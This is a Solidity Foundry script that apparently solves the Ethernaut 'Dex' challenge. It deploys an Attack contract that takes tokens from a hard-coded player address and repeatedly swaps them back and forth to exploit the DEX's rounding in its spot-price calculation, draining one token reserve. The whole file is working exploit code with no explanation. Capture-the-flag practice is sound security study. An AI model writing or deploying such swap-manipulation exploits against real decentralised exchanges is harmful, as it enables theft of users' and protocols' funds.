// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Dex} from "../src/Dex.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";


contract DexSolve is Script{
    Dex public dex = Dex(0x13dC383F59782676f31c55baa715C6F24E4d8CF5);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address token1 = address(dex.token1());
        address token2 = address(dex.token2());

        console.log("Token 1 : ", token1);
        console.log("Token 2 : ", token2);

        console.log("DEX balance in TOKEN1 ", dex.balanceOf(token1, address(dex)));
        console.log("DEX balance in TOKEN2 ", dex.balanceOf(token2, address(dex)));

        Attack attack = new Attack();
        
        dex.approve(address(attack), 10);

        attack.exploit();

        console.log("Attacker balance in TOKEN1 ", dex.balanceOf(token1, address(attack)));
        console.log("Attacker balance in TOKEN2 ", dex.balanceOf(token2, address(attack)));

        console.log("DEX balance in TOKEN1 ", dex.balanceOf(token1, address(dex)));
        console.log("DEX balance in TOKEN2 ", dex.balanceOf(token2, address(dex)));
        vm.stopBroadcast();

    }
}

contract Attack{
    Dex public dex = Dex(0x13dC383F59782676f31c55baa715C6F24E4d8CF5);
    address token1 = dex.token1();
    address token2 = dex.token2();
    function exploit() public{
        IERC20(token1).transferFrom(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602, address(this), 10);
        IERC20(token2).transferFrom(0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602, address(this), 10);
        
        dex.approve(address(dex), type(uint64).max);

        dex.swap(token1, token2, dex.balanceOf(token1, address(this)));
        dex.swap(token2, token1, dex.balanceOf(token2, address(this)));
        dex.swap(token1, token2, dex.balanceOf(token1, address(this)));
        dex.swap(token2, token1, dex.balanceOf(token2, address(this)));
        dex.swap(token1, token2, dex.balanceOf(token1, address(this)));

        dex.swap(token2, token1, 45);

        
    }
}